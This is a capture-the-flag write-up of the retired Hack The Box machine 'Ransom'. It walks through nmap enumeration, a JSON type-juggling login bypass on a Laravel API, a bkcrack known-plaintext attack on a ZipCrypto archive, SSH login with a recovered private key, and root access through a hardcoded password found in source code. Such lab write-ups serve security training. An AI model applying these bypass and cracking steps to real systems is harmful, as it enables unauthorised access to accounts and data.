# Ransom

This is the write-up for the box Ransom that got retired at the 15th March 2022.
My IP address was 10.10.14.7 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.153    ransom.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/ransom.nmap 10.10.11.153
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title:  Admin - HTML5 Admin Template
|_Requested resource was http://10.10.11.153/login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web service hosts a custom developed website with the title _"E Corp Incident Response Secure File Transfer"_ and has a login form to send files to the _E Corp Engineers_.

When sending the login request to a proxy like **Burpsuite**, it is possible to analyze it further.
```
GET /api/login?password=Test1 HTTP/1.1
(...)

Cookie: XSRF-TOKEN=eyJpdiI6IllvcXVkaUJBaGZSRWVSc(...); laravel_session=eyJpdiI6InNlazlNNzg2c3NTVjd0UlpM(...)
```

The cookie _laravel_session_ indicates that the web server uses the **Laravel framework**, which uses PHP in the background.

When sending no value in the _password_ parameter, it responds with JSON data:
```json
{
  "message":"The given data was invalid.",
  "errors":{
    "password":["The password field is required."
    ]
  }
}
```

By changing the _Content-Type_ to _application/json_ and sending the password in that format, it can be confirmed that JSON data is accepted:
```
GET /api/login HTTP/1.1
Content-Type: application/json
(...)

{
	"password":"password"
}
```

This way of sending data can be exploited by setting the variable to _true_:
```
{
	"password":true
}
```
```
Login Successful
```

After sending the request, the login is successful and the file transfer service contains a ZIP file with the description _"Encrypted Home Directory"_, that can be downloaded to analyze it.

## Analyzing ZIP File

When trying to decompress the ZIP file, it asks for a password.
The tool `7z` shows the included files and which encryption algorithm was used:
```
7z l -slt uploaded-file-3422.zip
```
```
Method = ZipCrypto Deflate
```

The **ZipCrypto** method has a vulnerability and the password can be found out with a **Known-Plaintext Attack**.
For this attack, we need to know the contents of one of the files in the archive.

As it is a home directory, there are default files in there like _bash_logout_, which is rarely modified, so it can be compared to ours and when the size is the same, it is likely that the contents are identical.

Creating a ZIP archive with our _bash_logout_ file:
```
zip bash_logout.zip bash_logout
```

If the _CRC_ is identical to the other one, then the contents are the same and the attack can be done:
```
7z l -slt bash_logout.zip

CRC = 6CE3189B
```

Using [bkcrack](https://github.com/kimci86/bkcrack) to get the plaintext password:
```
./bkcrack -C uploaded-file-3422.zip -c .bash_logout -P bash_logout.zip -p bash_logout
```

After a while it will create keys, which can be used to change the password of the ZIP file:
```
7b549874 ebc25ec5 7e465e18
```

Creating a new archive with our password:
```
./bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip NewPass123
```

Decompressing the new archive _unlocked.zip_:
```
unzip unlocked.zip
```

In the folder _.ssh_ is a private SSH key for the user _htb@ransom_ that can be used to login:
```
ssh -i .ssh/id_rsa htb@10.10.11.153
```

## Privilege Escalation

The configuration file _/etc/apache2/sites-enabled/000-default.conf_ shows that the files of the web service are in _/srv/prod_.
In there the file _routes/api.php_ has the class name of the login form:
```
Route::get('/login', [AuthController::class, 'customLogin'])->name('apilogin');
```

In the file _app/Http/Controllers/AuthController.php_ is a static password:
```
($request->get('password') == "UHC-March-Global-PW!")
```

When testing the password with the command `su -` it is possible to switch users to root!
